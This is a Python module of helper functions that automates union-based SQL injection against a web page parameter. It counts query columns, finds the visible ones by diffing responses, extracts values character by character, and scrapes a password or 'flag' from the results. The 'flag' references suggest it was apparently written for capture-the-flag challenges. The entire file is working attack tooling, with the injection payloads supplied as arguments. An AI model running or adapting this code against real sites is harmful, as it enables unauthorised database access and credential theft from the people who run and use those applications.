import requests
from requests.exceptions import HTTPError
import pickle
# import cPickle as pickle
from bs4 import BeautifulSoup
import re
import difflib


def get_request(url: str, param: dict, cook={}, method='get') -> str:
    try:
        response = (requests.get(url, params=param, cookies=cook)
                    if method == 'get' else
                    requests.post(url, data=param, cookies=cook))
        response.raise_for_status()
    except HTTPError as http_err:
        print(f'HTTP error occurred: {http_err}')
    except Exception as err:
        print(f'Other error occurred: {err}')
    else:
        print(param)
        return response.text


def find_error(url: str, param: str, cook: dict) -> str:
    html_responce = get_request(url, param, cook).replace(
        '<b>', '').replace('</b>', '').replace('\n', '')
    soup = BeautifulSoup(html_responce, 'html.parser')
    war = soup.find_all(string=re.compile("Warning"))
    return war


def none_func(s: str) -> str:
    return s


def count_columns(url: str, payload: str, p: str, cook={}, encode=none_func) -> int:
    max_columns = 30
    html_responce_1 = ''
    for i in range(1, max_columns):
        pl = payload % str(i)
        print(pl)
        param = {p: encode(pl)}
        html_responce_2 = get_request(url, param, cook)
        for s in difflib.ndiff(html_responce_2, html_responce_1):
            if i > 1 and ('+' in s[0] or '-' in s[0]):
                return i - 1
            html_responce_1 = html_responce_2
    print('num of columns not find')
    exit(1)


def find_visible_columns(url: str, num_columns: int,
                         payload: str, p: str, p_base: str,
                         cook={}, encode=none_func) -> list:
    list_of_visible = []
    print(payload)
    param = {p: encode(payload)}
    html_responce = get_request(url, param, cook)

    # Find differens
    param = {p: p_base}
    html_base = get_request(url, param, cook)
    for s in difflib.ndiff(html_responce, html_base):
        if s[0] == ' ':
            continue
        elif s[0] == '-':
            try:
                if int(s[-1]) in range(num_columns + 1):
                    list_of_visible.append(int(s[-1]))
            except:
                continue
    if not list_of_visible:
        print('not find visible column')
        exit(1)
    return [list_of_visible, html_responce]


def find_param(url: str, list_of_columns: list,
               list_of_visible: list, html_visible: str,
               payload: str, p: str, cook={}, encode=none_func) -> list:
    param = {p: encode(payload)}
    html_responce = get_request(url, param, cook)

    # Find differens
    n = -1
    key = [''] * len(list_of_visible)

    # print(html_responce)
    for s in difflib.ndiff(html_responce, html_visible):
        if s[0] == ' ':
            continue
        elif s[0] == '-':
            key[n] += s[-1]
        elif s[0] == '+':
            n += 1
    return key


def find_column_position(url: str, list_of_columns: list, payload: str,
                         p: str, finds: str, cook={}) -> int:
    for i in range(len(list_of_columns)):
        tmp = list_of_columns[i]
        list_of_columns[i] = finds
        param = {p: payload % (','.join(list_of_columns))}
        response = get_request(url, param, cook)
        soup = BeautifulSoup(response, 'html.parser')
        ret = soup.find(string=re.compile('rows'))
        if str(len(list_of_columns)) in ret:
            print(ret, i)
            return i
        list_of_columns[i] = tmp
    print('column position not found')
    exit(1)


def extract_pass(response: str, pass_r: str) -> str:
    soup = BeautifulSoup(response.replace('<b>', ''), 'html.parser')
    print(soup.find_all(string=re.compile("flag")))
    passw = soup.find(string=re.compile(pass_r))
    return passw


def save_cookies(cooks: dict):
    try:
        with open('cooks.pickle', 'wb') as f:
            pickle.dump(cooks, f)
    except:
        print('can not write cookies')
        exit(1)
